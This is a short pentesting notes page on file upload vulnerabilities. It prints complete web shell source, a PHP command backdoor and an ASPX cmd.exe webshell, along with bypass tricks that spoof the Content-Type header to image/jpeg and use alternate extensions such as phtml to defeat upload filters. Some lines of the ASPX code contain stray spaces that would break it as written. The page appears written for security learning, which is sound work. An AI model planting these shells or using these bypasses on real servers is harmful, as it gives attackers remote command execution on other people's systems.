# File Upload

Web applications sometimes let users upload file files to their site in the form of a profile picture, PDF upload functionality, etc.&#x20;

* If done improperly attackers can upload malicious files potentially gaining RCE.
* If an application does not have any restrictions to which file type can be uploaded, an attacker could upload a PHP script and if it's in the web directory we can navigate to it and it will execute.

### <mark style="color:yellow;">Simple cmd backdoor</mark>

PHP

```php
<?php 
if(isset($_REQUEST['cmd'])){ 
echo "<pre>"; 
$cmd = ($_REQUEST['cmd']); 
system($cmd); 
echo "</pre>"; 
die; 
}
?>

```

ASPX

```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">

void Page_Load(object sender, EventArgs e){}string 
ExcuteCmd(string arg){
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}

void cmdExe_Click(object sender, System.EventArgs e){
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtAr g.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
    <title>awen asp.net webshell</title>
</HEAD>
<body>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; 
POSITION: absolute; TOP: 20px" 
runat="server" 
Width="250px">
</asp:TextBox>
<asp:Butt on id="testing" style="Z-INDEX: 102; 
LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" 
OnClick="cmdExe_Click">
</asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 
103; LEFT: 310px; POSITION: absolute; TOP: 22px" 
runat="server">Command:
</asp:Label>
</form>
</body>
</HTML>
```

#### EX: Vulnerable upload function leads to upload of PHP web shell successfully:

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* Once uploaded, navigate to the backdoor and execute any shell command (whoami):

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Successfully uploaded gaining RCE.

### <mark style="color:yellow;">Content Type Bypass</mark>

The server validates the content of the file by checking the **MIME type** of the file, which can be found in the HTTP request.

If the server trusts the content-type in the HTTP request an attacker could change its value to pass the validation.

EX: Content-Type: application/x-php:

* bypass  --> Content-Type: image/jpeg

### <mark style="color:yellow;">File Name Bypass</mark>

When the server checks the file name to see if it is **blacklisted** or **whitelisted**.

* developers use a regex to check the file extension:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption><p>Regex for balcklisteed extensions</p></figcaption></figure>

Here, bypass the regex validation by changing the extension to “phpt” and “phtml”.
